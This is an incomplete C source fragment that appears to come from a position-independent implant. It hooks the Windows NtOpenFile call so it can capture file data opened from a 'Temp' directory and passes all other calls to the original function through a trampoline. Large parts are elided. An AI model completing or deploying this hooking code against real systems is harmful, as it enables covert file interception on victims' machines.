...
SEC( text, B ) NTSTATUS Entry( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions ) 
{
    INSTANCE Instance = { };
    ...
    wchar_t* hookdir =  GET_SYMBOL( L"Temp" );
	
	wchar_t* pHookDir = NULL;

	if(ObjectAttributes->ObjectName->Buffer != NULL)
	{
		//First things first, we need to determine if we want to capture the file/data associated with the NtOpenFile call. To do so, check the filepath looking for our hookdir value.
		pHookDir = Instance.Win32.wcsstr(ObjectAttributes->ObjectName->Buffer, hookdir);
	}
	...
	if (pHookDir != NULL)
	{
		//Instance.Win32.MessageBoxW( NULL, ObjectAttributes->ObjectName->Buffer, GET_SYMBOL( L"testargs" ), MB_OK );
        //Instance.Win32.MessageBoxA( NULL, GET_SYMBOL( "In NtCreateFileHook special dir!" ), GET_SYMBOL( "MessageBox Title" ), MB_OK );
		//printf("found the hookdir!\n");
		...
		//Note this shouldn't ever really happen in NtOpenFile, but leaving this here in case.
		if (!matchfound)
		{
	...
	//If our hookdir wasn't found in the path, this is a normal call to NtOpenFile and we patch it back to the original NtOpenFile with the trampoline.
	else
	{
		_NtOpenFile f = (_NtOpenFile)pFileInfo->NtOpenFiletrampoline;
